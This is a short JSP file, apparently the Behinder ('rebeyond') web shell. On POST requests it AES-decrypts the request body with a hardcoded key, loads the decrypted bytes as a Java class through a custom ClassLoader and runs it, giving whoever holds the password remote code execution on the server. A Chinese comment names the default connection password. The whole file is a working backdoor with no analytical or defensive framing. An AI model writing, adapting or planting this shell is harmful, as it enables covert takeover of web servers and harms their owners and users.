<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
class U extends ClassLoader{
    U(ClassLoader c){
        super(c);
    }
    public Class g(byte []b){
        return super.defineClass(b,0,b.length);
    }
}
%>
<%
if (request.getMethod().equals("POST")){
    String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
    session.putValue("u",k);
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
}
%>